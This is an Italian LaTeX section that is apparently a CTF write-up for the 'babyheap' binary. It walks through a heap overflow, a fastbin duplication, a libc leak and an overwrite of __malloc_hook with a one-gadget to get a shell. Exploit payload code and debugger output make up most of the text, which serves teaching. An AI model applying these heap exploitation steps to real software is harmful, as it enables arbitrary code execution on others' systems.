\subsection{Babyheap}\label{cap:babyheap}
L'eseguibile \emph{babyheap} mostra un menu con quattro operazioni:
\begin{enumerate}

	\item \emph{allocate}: dopo aver chiesto una dimensione alloca uno spazio in memoria ($\leqslant$ 0x1000) tramite la funzione \verb+calloc+
    \item \emph{fill}: riempie uno spazio in memoria precedentemente allocato. Qui risiede la vulnerabilità, poichè chiede all'utente la dimensione dei dati da inserire senza effettuare un controllo sulla dimensione inserita durante l'allocazione
    \item \emph{free}: libera uno spazio in memoria
    \item \emph{dump}: stampa il contenuto dello spazio in memoria allocato
\end{enumerate}

Effettuando un \verb+checksec+ sul binario, vediamo che esso è compilato a 64 bit, è Full RELRO, per cui non è possibile sovrascrivere la got table ed ha PIE abilitato:

\begin{Verbatim}[commandchars=\\\{\}]
    Arch:     amd64-64-little
    RELRO:    \textcolor{green}{Full RELRO}
    Stack:    \textcolor{green}{Canary found}
    NX:       \textcolor{green}{NX enabled}
    PIE:      \textcolor{green}{PIE enabled}
\end{Verbatim}

L'exploit si basa sulla duplicazione dei chunck nei bin, in particolare nel fastbin e nello smallbin, in modo tale che con successive chiamate a \verb+malloc+ è possibile ottenere la stessa locazione in memoria.
E' importante precisare che non è possibile sfruttare uno \emph{use-after-free}, in quanto i puntatori vengono posti a zero dopo che sono stati liberati.
Essendo i chunk allocati in memoria in modo contiguo è possibile, tramite la \emph{fill} offerta dal programma, effettuare un overflow e sovrascrivere i metadati dei chunk successivi, in particolare del campo \verb+FD+, ovvero il puntatore al chunk successivo in un bin, utilizzato nei fastbin, come puntatore per la gestione di una single linked list.

\begin{verbatim}
    allocate(10)        # -> A
    allocate(10)        # -> B
    allocate(10)        # -> C
    allocate(10)        # -> D
    allocate(0x80)      # -> E {sizeof(smallbin[0]) in 64 bit}
    allocate(10)        # altrimenti E va in top chunk dopo free
\end{verbatim}

Inizialmente si allocano 6 chunk e successivamente con le seguenti istruzioni, si liberano il secondo e il primo:

\begin{verbatim}
    free(2)
    free(1)
\end{verbatim}

In questo modo, essendo i chunk liberati di dimensioni 0x20, questi andranno a finire in \verb+fastbin[0]+\footnote{\verb_fastbin[0]_ contiene i chunk di dimensione 0x20}.
Per cui il primo fastbin contiene la seguente lista di chunk\footnote{ricordando che gli inserimenti e le rimozioni dai fastbin vengono effettuate in testa, con una politica di tipo LIFO}: \verb+[B, C]+.

Essendo il chunk A precedente in memoria al chunk B, con un overflow si modifica parte del campo \verb+FD+, in particolare l'ultimo byte, in modo tale che questo punti al chunk E, quello con dimensione 0x80.

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x21)
    payload += p8(0x80)
    fill(0, payload)
\end{verbatim}

Se si richiede tramite \verb+malloc+, o in questo caso con una \verb+calloc+, una porzione di memoria con chunk size $\leqslant$ 0x20, questa restituirà il primo elemento del fastbin[0]. Tuttavia quando la \verb+malloc+ estrae questo elemento dalla coda, effettua un controllo sulla \verb+FD->size+, che deve corrispondere alla dimensione dei chunk del fastbin in questione, in questo caso a 0x20.
Quindi con un altro overflow si modifica la dimensione del quinto chunk:

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x21)
    fill(3, payload)
\end{verbatim}

A questo punto vengono eseguite due \verb+calloc+:

\begin{verbatim}
    allocate(10)
    allocate(10)
\end{verbatim}

In particolare, la prima preleva B dal fastbin e poichè \verb+B->FD+ non è più C ma E, il secondo allocate preleva E, mettendolo in posizione 2 dell'array.
In questo modo due puntatori puntano a un'unico indirizzo in memoria.

\paragraph{Leak del base address della libc}

Ora quello che ci serve è un leak della libc. Ricordando che uno smallbin è una lista doppiamente concatenata e circolare, con puntatori \verb+FD+ e \verb+BK+ che indicano rispettivamente il chunk successivo e quello precedente e che uno smallbin vuoto ha i campi \verb+FD+ e \verb+BK+ pari all'indirizzo dello smallbin stesso, inserendo un chunk in uno smallbin tramite \verb+free+, il suo campo \verb+FD+ verrà popolato con l'indirizzo dello smallbin, che si trova proprio nella libc.

Prima di dare il chunk alla \verb+free+, è importante che la sua dimensione sia ripristinata:

\begin{verbatim}
    payload =  p64(0) * 3
    payload += p64(0x91)
    fill(3, payload)
\end{verbatim}

Poi si effettua una \verb+free+ del chunk E, che va a finire in \verb+smallbin[0]+:

\begin{verbatim}
    free(4)
\end{verbatim}

A questo punto, poichè il secondo elemento dell'array punta allo stesso chunk, tramite una \verb+dump+ è possibile vedere il contenuto dei puntatori \verb+FD+ e \verb+BK+, ricordando che in un chunk che viene liberato con \verb+free+ corrisponde ai primi 16 byte (in sistemi a 64 bit) della zona usata dall'applicazione.
Conoscendo l'offset dal base address della libc è possibile ottenere l'indirizzo.

\paragraph{Ottenimento di una shell}
Essendo il binario Full RELRO, non è possibile modificare alcuna entry della got table. Quindi per richiamare le funzioni della libc, si può utilizzare \verb+__malloc_hook+, un puntatore a funzione che \verb+malloc+ invoca se questo è diverso da \verb+NULL+.

\begin{Verbatim}[commandchars=\\\{\}]
    \textcolor{red}{pwndbg>} x/10gx (long)&main_arena - 0x40
    \textcolor{blue}{0x7ff0cd8a0ac0} <\textcolor{orange}{_IO_wide_data_0}+288>:   0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0ad0} <\textcolor{orange}{_IO_wide_data_0}+304>:   0x00007ff0cd8a1e00      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0ae0} <\textcolor{orange}{__memalign_hook}>:       0x00007ff0cd7865d0      0x00007ff0cd786580
    \textcolor{blue}{0x7ff0cd8a0af0} <\textcolor{orange}{__malloc_hook}>:         0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0b00} <\textcolor{orange}{main_arena}>:            0x0000000000000000      0x0000000000000000
\end{Verbatim}

L'indirizzo \verb+0x7ff0cd8a0af0+ è proprio il nostro target. Per sovrascrivere questa zona di memoria possiamo ricorrere nuovamente ad un fastbin attack, iniettando come indirizzo \verb+0x7ff0cd8a0af0+, 16 byte prima di \verb+__malloc_hook+.
Tuttavia la \verb+malloc+ controlla se la dimensione del chunk è pari a quella del fastbin in cui si trova, ma in questo caso la dimensione, \verb+0x7ff0cd786580+ è di gran lunga superiore a quella di qualsiasi fastbin. La \verb+malloc+ non richiede alcun allineamento degli indirizzi, per cui è possibile iniettare un indirizzo con un certo offset rispetto a quello visto e \emph{forzare} la dimensione a 0x7f.

\begin{Verbatim}[commandchars=\\\{\}]
    \textcolor{red}{pwndbg>} x/10gx (long)&main_arena - 0x40+0xd
    \textcolor{blue}{0x7ff0cd8a0acd} <\textcolor{orange}{_IO_wide_data_0}+301>:   0xf0cd8a1e00000000      0x000000000000007f
    \textcolor{blue}{0x7ff0cd8a0add}:                         0xf0cd7865d0000000      0xf0cd78658000007f
    \textcolor{blue}{0x7ff0cd8a0aed} <\textcolor{orange}{__realloc_hook}+5>:      0x000000000000007f      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0afd}:                         0x0000000000000000      0x0000000000000000
    \textcolor{blue}{0x7ff0cd8a0b0d} <\textcolor{orange}{main_arena}+13>:         0x0000000000000000      0x0000000000000000
\end{Verbatim}

L'indirizzo \verb+0x7ff0cd8a0acd+ è proprio ciò che cercavamo. Iniettando questo indirizzo è possibile far credere alla \verb+malloc+ che la dimensione del chunk è 0x7f, che corrisponde
ad un chunk di dimensione 0x70 in un fastbin.
Per cui si effettua lo stesso attacco di prima:

\begin{verbatim}
    allocate(0x68)
    allocate(0x68)

    free(7)

    payload =  p64(0) * 17
    payload += p64(0x71)
    payload += p64(libc_base + 0x19bacd)
    fill(6, payload)
\end{verbatim}

Si allocano due chunk, se ne libera uno e si fa un overflow sul \verb+FD+ del settimo chunk.

\begin{verbatim}
    allocate(0x68)
    allocate(0x68)  # pos 8
\end{verbatim}

Con due richieste ad \verb+allocate+ di dimensione del fastbin con chunk di grandezza 0x70, si ottiene in posizione 8 dell'array un chunk all'indirizzo \verb+0x7ff0cd8a0acd+.
E' possibile ora controllare il puntatore \verb+__malloc_hook+.

Per ottenere una shell, avendo l'indirizzo base della libc, è stato utilizzato un tool in python, \verb+magic.py+\cite{magicpy}, che utilizza le API di \verb+radare2+, per cercare il \emph{magic gadget}, un indirizzo nella libc che esegue \verb+exec("/bin/sh")+. Nel caso della libc considerata, questo si trova ad un offset \verb+0x45682+ rispetto il base address della libc.

\begin{verbatim}
    payload =  p8(0) * 19
    payload += p64(libc_base + 0x45682)     # magic gadget
    fill(8, payload)
\end{verbatim}

Si fa un \verb+fill+ dell'ottavo chunk, sovrascrivendo \verb+__malloc_hook+, ed eseguendo

\begin{verbatim}
    allocate(1)
\end{verbatim}

si invoca la funzione puntata da \verb+__malloc_hook+, ottendendo in questo modo una shell.